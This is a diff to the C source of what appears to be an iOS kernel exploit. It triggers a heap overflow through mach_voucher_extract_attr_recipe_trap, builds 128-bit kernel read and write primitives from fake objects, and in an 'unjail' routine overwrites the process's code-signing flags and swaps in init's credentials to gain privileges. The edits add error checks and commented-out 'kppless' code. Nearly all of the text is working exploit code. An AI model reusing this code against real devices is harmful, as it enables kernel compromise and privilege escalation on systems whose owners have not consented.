@@ -236,11 +236,7 @@ void do_overflow(uint64_t kalloc_size, uint64_t overflow_length, uint8_t* overfl
   
   // trigger the bug!
   mach_port_t port = get_voucher();
-  kern_return_t err = mach_voucher_extract_attr_recipe_trap(
-                                                            port,
-                                                            1,
-                                                            recipe,
-                                                            recipe_size);
+  mach_voucher_extract_attr_recipe_trap(port, 1, recipe, recipe_size);
 }
 
 kern_return_t catch_exception_raise
@@ -389,6 +385,11 @@ void send_prealloc_msg(mach_port_t port, uint64_t* buf, int n) {
   // associate the pthread_t with the port so that we can join the correct pthread
   // when we receive the exception message and it exits:
   kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);
+    
+  if(err != KERN_SUCCESS) {
+    printf("[ERROR]: failed setting the context pointer\n");
+  }
+    
   printf("set context\n");
   // wait until the message has actually been sent:
   while(!port_has_message(port)){;}
@@ -456,6 +457,10 @@ uint128_t rk128(uint64_t address) {
   printf("fake_obj: 0x%x\n", target_uc);
   kern_return_t err = IOConnectGetService(target_uc, &service);
   
+  if(err != KERN_SUCCESS) {
+      printf("[ERROR]: couldn't connect to service\n");
+  }
+    
   uint64_t* out = receive_prealloc_msg(oob_port);
   uint128_t value = {out[9], out[10]};
   
@@ -485,6 +490,10 @@ void wk128(uint64_t address, uint128_t value) {
   printf("fake_obj: 0x%x\n", target_uc);
   kern_return_t err = IOConnectGetService(target_uc, &service);
   
+  if(err != KERN_SUCCESS) {
+    printf("[ERROR]: failed connecting to service\n");
+  }
+    
   receive_prealloc_msg(oob_port);
 
   send_prealloc_msg(oob_port, legit_object, 30);
@@ -601,7 +610,7 @@ uint64_t prepare_kernel_rw() {
 }
 
 int jb_go() {
-  int rv = init_offsets();
+  int rv = init_extra_offsets();
   if (rv) return rv;
   uint64_t kernel_base = prepare_kernel_rw();
 #if 0
@@ -763,6 +772,7 @@ __text:FFFFFFF006337E10
   return kread_uint32(where + 0x38);
 }
 
+// Not really used
 int
 unjail(void)
 {
@@ -821,11 +831,18 @@ unjail(void)
     kwrite_uint32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_KILL | CS_HARD));
     uint64_t our_cred = kread_uint64(our_proc + offsetof_p_ucred);
     uint64_t init_cred = kread_uint64(init_proc + offsetof_p_ucred);
+    
+    // kppless (TODO: use after it actually works)
+//    uint64_t kern_cred = kread_uint64(kern_proc + offsetof_p_ucred);
+    
     kwrite_uint64(our_proc + offsetof_p_ucred, init_cred);
 
     extern int go_extra_recipe(void);
     rv = go_extra_recipe();
 
+//    extern kern_return_t go_kppless(uint64_t, uint64_t);
+//    rv = go_kppless(allproc + kaslr_shift, kern_cred);
+    
     kwrite_uint64(our_proc + offsetof_p_ucred, our_cred);
     return rv;
 }
